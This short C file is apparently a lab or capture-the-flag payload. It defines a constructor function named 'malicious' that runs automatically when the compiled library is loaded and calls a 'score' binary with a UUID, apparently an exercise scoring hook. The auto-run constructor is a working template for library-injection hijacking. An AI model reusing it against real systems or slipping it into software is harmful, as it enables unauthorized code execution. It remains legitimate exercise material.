	#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score 0ea0c2fe-cf08-4cfb-a602-9d72feb1c7bc");
}